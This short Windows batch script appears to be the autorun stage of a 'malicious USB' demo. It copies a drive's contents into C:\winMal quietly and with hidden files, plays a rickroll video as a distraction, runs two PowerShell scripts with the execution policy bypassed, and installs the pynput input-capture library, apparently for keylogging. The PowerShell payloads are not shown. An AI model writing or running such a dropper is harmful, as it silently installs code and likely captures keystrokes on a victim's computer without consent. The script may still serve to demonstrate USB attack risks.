mkdir C:\winMal
xcopy E:\MaliciousUSBDemo C:\winMal /s /h /q
start C:\winMal\rickroll.mp4
powershell -executionPolicy bypass -file "C:\winMal\Code\Scripts\drive1.ps1"
cd C:\Program Files\Python311\Scripts
pip.exe install pynput
start powershell -executionPolicy bypass -noexit -file "C:\winMal\Code\Scripts\drive2.ps1"
